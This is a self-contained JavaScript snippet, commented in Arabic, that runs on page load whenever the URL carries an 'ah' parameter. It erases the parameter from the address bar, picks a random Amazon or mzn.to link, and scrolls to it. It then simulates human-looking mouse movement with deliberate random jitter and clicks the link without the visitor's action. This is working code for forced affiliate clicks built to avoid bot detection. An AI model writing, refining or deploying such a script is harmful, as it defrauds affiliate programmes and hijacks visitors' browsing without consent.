(function() {
    const TRACKING_PARAM_TO_REMOVE = 'ah';
    const TARGET_SELECTOR = 'a[href*="amazon"], a[href*="mzn.to"]';
    let isRedirecting = false;

    // دالة مساعدة لتوليد تأخير عشوائي
    function getRandomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // ✅ دالة محاكاة حركة الماوس مع إضافة الانحراف العشوائي لكسر النمط الثابت
    function simulateMouseMovement(targetElement, duration, callback) {
        const rect = targetElement.getBoundingClientRect();
        const targetX = rect.left + rect.width / 2;
        const targetY = rect.top + rect.height / 2;

        const startX = window.innerWidth * Math.random();
        const startY = 100 + window.scrollY; 

        let startTime = null;
        
        // أقصى قيمة للانحراف العشوائي بالبكسل
        const MAX_NOISE = 15; 

        const step = (timestamp) => {
            if (!startTime) startTime = timestamp;
            const elapsed = timestamp - startTime;
            const progress = Math.min(1, elapsed / duration);

            // 1. حساب الموضع الخطي (الخط المستقيم)
            const currentX_straight = startX + (targetX - startX) * progress;
            const currentY_straight = startY + (targetY - startY) * progress;

            // 2. ✅ إضافة الانحراف العشوائي (الضوضاء)
            // الانحراف يكون أكبر في البداية ويقل تدريجياً كلما اقتربنا من الهدف (حتى يساوي صفر عند 100%)
            const noiseFactor = (1 - progress); 
            const noiseX = (Math.random() - 0.5) * MAX_NOISE * noiseFactor;
            const noiseY = (Math.random() - 0.5) * MAX_NOISE * noiseFactor;

            const currentX = currentX_straight + noiseX;
            const currentY = currentY_straight + noiseY;

            // إرسال حدث mousemove
            targetElement.dispatchEvent(new MouseEvent('mousemove', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: currentX,
                clientY: currentY
            }));

            if (progress < 1) {
                window.requestAnimationFrame(step);
            } else {
                // عند الانتهاء (progress = 1)، يتم التأكد من أن الماوس في المركز تماماً
                targetElement.dispatchEvent(new MouseEvent('mousemove', {
                    view: window, bubbles: true, cancelable: true,
                    clientX: targetX,
                    clientY: targetY
                }));
                if (callback) callback(); 
            }
        };
        
        window.requestAnimationFrame(step);
    }

    // دالة إزالة الباراميتر
    function cleanupURL() {
        const url = new URL(window.location.href);
        const searchParams = url.searchParams;
        if (searchParams.has(TRACKING_PARAM_TO_REMOVE)) {
            searchParams.delete(TRACKING_PARAM_TO_REMOVE);
            history.replaceState(null, null, url.toString());
            return true;
        }
        return false;
    }

    // دالة اختيار رابط عشوائي
    function findRandomTargetLink() {
        const allLinks = document.querySelectorAll(TARGET_SELECTOR);
        if (allLinks.length > 0) {
            const randomIndex = Math.floor(Math.random() * allLinks.length);
            return allLinks[randomIndex];
        }
        return null;
    }

    // دالة التنفيذ الرئيسية
    function smartClickAndScroll() {
        if (isRedirecting) return;

        const paramWasPresent = cleanupURL();
        if (!paramWasPresent) return;

        const linkElement = findRandomTargetLink();

        if (linkElement) {
            isRedirecting = true;

            const randomClickDelay = getRandomDelay(1000, 4000); 
            const randomScrollDelay = getRandomDelay(500, 2000); 
            const randomMoveDuration = getRandomDelay(500, 1500); 

            // 1. التمرير الناعم إلى الرابط المستهدف
            linkElement.scrollIntoView({
                behavior: 'smooth',
                block: 'center'
            });

            // 2. الانتظار لانتهاء التمرير وبدء حركة الماوس
            setTimeout(() => {
                simulateMouseMovement(linkElement, randomMoveDuration, () => {
                    // 3. الانتظار لانتهاء مدة النقر العشوائية، ثم النقر
                    setTimeout(() => {
                        linkElement.click(); // محاكاة النقر
                    }, randomClickDelay);
                });
            }, randomScrollDelay);

            return;
        }

        requestAnimationFrame(smartClickAndScroll);
    }

    // تشغيل المنطق عند تحميل محتوى الصفحة بالكامل
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        smartClickAndScroll();
    }
    document.addEventListener('DOMContentLoaded', smartClickAndScroll);
})();
